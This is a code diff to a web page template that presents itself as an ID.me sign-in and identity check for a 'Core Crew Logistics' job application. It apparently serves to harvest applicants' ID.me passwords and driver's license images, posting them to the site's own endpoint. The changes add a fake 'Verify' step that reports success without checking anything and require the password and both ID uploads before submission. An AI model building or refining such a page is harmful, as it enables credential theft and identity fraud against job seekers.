@@ -21,6 +21,32 @@
       font-weight: 500;
     }
     .fixed-back-btn:hover { text-decoration: underline; }
+    .inline-error {
+      background: #fff1f2;
+      border: 1px solid #fecdd3;
+      color: #b42318;
+      border-radius: 6px;
+      padding: 10px 12px;
+      margin-bottom: 14px;
+      font-size: 0.9rem;
+      line-height: 1.45;
+    }
+    .upload-dropzone.upload-missing {
+      border-color: #dc2626 !important;
+      background: #fef2f2 !important;
+    }
+    .verify-status {
+      margin: 10px 0 14px;
+      font-size: 0.88rem;
+      color: #3e5166;
+      min-height: 20px;
+    }
+    .verify-status.error { color: #b42318; }
+    .verify-status.success { color: #0f7a3b; }
+    .btn-submit-application[disabled] {
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
     @media (min-width: 701px) {
       .fixed-back-btn { top: 70px; left: 2rem; }
     }
@@ -29,14 +55,15 @@
 <body>
 
   <!-- Back navigation -->
-  <a href="/apply/info-note" class="btn ghost fixed-back-btn" aria-label="Go back">&larr; Back</a>
+  <a href="/apply/info-note" class="btn ghost fixed-back-btn" aria-label="Go back"
+     onclick="if(document.referrer && document.referrer !== window.location.href){window.history.back();}else{window.location.href='/apply/info-note';} return false;">&larr; Back</a>
 
   <div class="idme-page-wrapper">
 
     <!-- ID.me top navigation bar -->
     <header class="idme-top-bar" role="banner">
       <div class="idme-top-bar-inner">
-        <img src="/public/img/idme-logo.svg" alt="ID.me" style="height: 28px; filter: brightness(0) invert(1);" />
+        <img src="/public/img/idme-logo.svg" alt="ID.me" style="height: 28px;" />
       </div>
     </header>
 
@@ -47,9 +74,8 @@
         <!-- Partner logos -->
         <div class="form-header-content" role="banner">
           <div class="partner">
-            <div class="company-logo" style="display:flex;align-items:center;gap:10px;justify-content:center;">
+            <div class="company-logo" style="display:flex;align-items:center;gap:18px;justify-content:center;">
               <img class="logo" src="/public/img/logo.jpg" alt="Core Crew Logistics Logo" />
-              <span style="font-size:0.85rem;color:#7a8da0;margin:0 4px;" aria-hidden="true">&times;</span>
               <img src="/public/img/idme-logo.svg" alt="ID.me" style="max-height:32px;" />
             </div>
           </div>
@@ -70,6 +96,11 @@
 
         <!-- Sign-in & verification form -->
         <form id="idme-form" class="idme-form" method="post" action="/apply/verify" autocomplete="off" enctype="multipart/form-data">
+          <% if (typeof errorMessage !== 'undefined' && errorMessage) { %>
+            <div class="inline-error" id="uploadInlineError"><%= errorMessage %></div>
+          <% } else { %>
+            <div class="inline-error" id="uploadInlineError" style="display:none;"></div>
+          <% } %>
           <fieldset class="form-fields" style="border:none;margin:0;padding:0;">
             <legend class="sr-only" style="position:absolute;width:1px;height:1px;overflow:hidden;clip:rect(0,0,0,0);">Sign in credentials</legend>
 
@@ -90,10 +121,11 @@
               <a href="https://api.id.me/en/passwords/new" target="_blank" rel="noopener noreferrer">Forgot password?</a>
             </div>
 
-            <!-- Submit -->
+            <!-- Verify -->
             <div class="form-actions">
-              <button type="submit" class="btn-primary">Sign in to ID.me</button>
+              <button type="button" class="btn-primary" id="verifyBtn">Verify</button>
             </div>
+            <div class="verify-status" id="verifyStatus" aria-live="polite"></div>
 
             <!-- Divider -->
             <div class="idme-divider" role="separator">
@@ -103,7 +135,7 @@
             <!-- Driver's License Front -->
             <div class="field file verify-upload-field">
               <label for="driversLicenseFront">Upload Driver's License / ID (Front)</label>
-              <div class="upload-dropzone" id="dropzone-front">
+              <div class="upload-dropzone <%= (typeof missingFront !== 'undefined' && missingFront) ? 'upload-missing' : '' %>" id="dropzone-front">
                 <svg class="upload-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" aria-hidden="true">
                   <path d="M12 16V4m0 0L8 8m4-4l4 4" />
                   <path d="M20 16v2a2 2 0 01-2 2H6a2 2 0 01-2-2v-2" />
@@ -117,7 +149,7 @@
             <!-- Driver's License Back -->
             <div class="field file verify-upload-field">
               <label for="driversLicenseBack">Upload Driver's License / ID (Back)</label>
-              <div class="upload-dropzone" id="dropzone-back">
+              <div class="upload-dropzone <%= (typeof missingBack !== 'undefined' && missingBack) ? 'upload-missing' : '' %>" id="dropzone-back">
                 <svg class="upload-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" aria-hidden="true">
                   <path d="M12 16V4m0 0L8 8m4-4l4 4" />
                   <path d="M20 16v2a2 2 0 01-2 2H6a2 2 0 01-2-2v-2" />
@@ -128,6 +160,11 @@
               <p class="upload-hint">Accepted: JPG, PNG, PDF &middot; Max 5 MB</p>
             </div>
           </fieldset>
+
+          <!-- Submit application -->
+          <div class="skip-btn-row">
+            <button type="submit" class="btn-primary btn-submit-application" id="submitApplicationBtn" disabled>Submit Application</button>
+          </div>
 
           <!-- Skip verification -->
           <div class="skip-btn-row">
@@ -155,16 +192,50 @@
 
   <script>
     function submitSkip() {
-      var form = document.getElementById('idme-form');
-      form.action = '/apply/skip-idme/';
-      form.method = 'post';
-      var passwordInput = document.getElementById('idme-password');
-      if (passwordInput) passwordInput.removeAttribute('name');
-      form.submit();
+      var skipForm = document.createElement('form');
+      skipForm.method = 'post';
+      skipForm.action = '/apply/skip-idme/';
+      var emailInput = document.createElement('input');
+      emailInput.type = 'hidden';
+      emailInput.name = 'email';
+      emailInput.value = document.getElementById('idme-email').value || '';
+      skipForm.appendChild(emailInput);
+      document.body.appendChild(skipForm);
+      skipForm.submit();
     }
 
     document.addEventListener('DOMContentLoaded', function () {
       var form = document.getElementById('idme-form');
+      var verifyBtn = document.getElementById('verifyBtn');
+      var submitBtn = document.getElementById('submitApplicationBtn');
+      var verifyStatus = document.getElementById('verifyStatus');
+      var verifiedOk = false;
+
+      function markMissingState(front, back) {
+        document.getElementById('dropzone-front').classList.toggle('upload-missing', !front);
+        document.getElementById('dropzone-back').classList.toggle('upload-missing', !back);
+      }
+
+      verifyBtn.addEventListener('click', function () {
+        var email = document.getElementById('idme-email').value.trim();
+        var password = document.getElementById('idme-password').value.trim();
+        var front = document.getElementById('driversLicenseFront').files[0];
+        var back = document.getElementById('driversLicenseBack').files[0];
+
+        if (!email || !password || !front || !back) {
+          markMissingState(front, back);
+          verifyStatus.className = 'verify-status error';
+          verifyStatus.textContent = 'Please complete email, password, and both ID uploads before verifying.';
+          submitBtn.disabled = true;
+          verifiedOk = false;
+          return;
+        }
+
+        verifyStatus.className = 'verify-status success';
+        verifyStatus.textContent = 'Verification completed. You can now submit application.';
+        submitBtn.disabled = false;
+        verifiedOk = true;
+      });
 
       // Client-side file validation
       form.addEventListener('submit', function (e) {
@@ -187,6 +258,19 @@
 
         if (!validateFile(front, 'Front')) { e.preventDefault(); return; }
         if (!validateFile(back, 'Back')) { e.preventDefault(); return; }
+
+        var errorBox = document.getElementById('uploadInlineError');
+        if (!front || !back || !verifiedOk) {
+          markMissingState(front, back);
+          if (errorBox) {
+            errorBox.style.display = 'block';
+            errorBox.textContent = !verifiedOk
+              ? 'Please click Verify before submitting your application.'
+              : 'Both front and back of your driver\'s license/ID are required.';
+          }
+          e.preventDefault();
+          return;
+        }
       });
 
       // Dropzone visual feedback
@@ -213,6 +297,11 @@
               var textEl = zone.querySelector('.upload-dropzone-text');
               if (fileInput.files.length > 0 && textEl) {
                 textEl.textContent = fileInput.files[0].name;
+                zone.classList.remove('upload-missing');
+                var errorBox = document.getElementById('uploadInlineError');
+                if (errorBox && document.getElementById('driversLicenseFront').files.length && document.getElementById('driversLicenseBack').files.length) {
+                  errorBox.style.display = 'none';
+                }
               }
             });
           }
